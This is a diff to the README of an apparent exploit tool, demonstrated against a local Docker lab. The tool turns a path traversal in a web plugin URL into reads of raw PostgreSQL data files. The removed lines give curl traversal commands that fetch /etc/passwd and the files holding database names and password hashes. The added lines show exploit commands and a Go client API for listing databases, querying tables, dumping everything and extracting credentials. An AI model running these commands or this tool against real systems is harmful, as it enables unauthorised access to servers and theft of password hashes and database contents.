@@ -13,37 +13,48 @@ docker compose up -d
 ```bash
 cd exploit
 go build -o exploit .
-./exploit http://localhost:13000
+
+# Summary (credentials + table list)
+./exploit http://localhost:13000 summary
+
+# List databases
+./exploit http://localhost:13000 dbs
+
+# List tables in a database
+./exploit http://localhost:13000 tables postgres
+
+# List columns in a table
+./exploit http://localhost:13000 columns postgres users
+
+# Query a specific table
+./exploit http://localhost:13000 query postgres users
+
+# Full dump
+./exploit http://localhost:13000 dump
 ```
 
-Output:
+## RemoteClient API
 
-```json
-{
-  "credentials": [
-    "admin:SCRAM-SHA-256$4096:..."
-  ],
-  "databases": {
-    "postgres": [
-      "sql_features (755 rows)"
-    ]
-  }
-}
-```
+```go
+// Create client with your path traversal reader
+client := pgdump.NewRemoteClient(func(path string) ([]byte, error) {
+    return httpGet(target + traversal + path)
+})
 
-## Manual
+// Explore
+client.Databases()                    // List all databases
+client.Tables(dbOID)                  // List tables
+client.Columns(dbOID, tableOID)       // List columns
+client.Query(dbOID, table, opts)      // Query with options
 
-```bash
-# 1. Test path traversal
-curl "http://localhost:13000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd"
+// Dump
+client.DumpTable(dbOID, table)        // Single table
+client.DumpDatabase(dbOID)            // Single database  
+client.DumpAll()                      // Everything
 
-# 2. Dump pg_database
-curl "http://localhost:13000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/postgresql/data/global/1262" -o 1262
-pgread -f 1262
-
-# 3. Dump password hashes
-curl "http://localhost:13000/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fvar/lib/postgresql/data/global/1260" -o 1260
-pgread -f 1260
+// Quick
+client.Summary()                      // Credentials + table names
+client.Credentials()                  // Just password hashes
 ```
 
 ## Impact
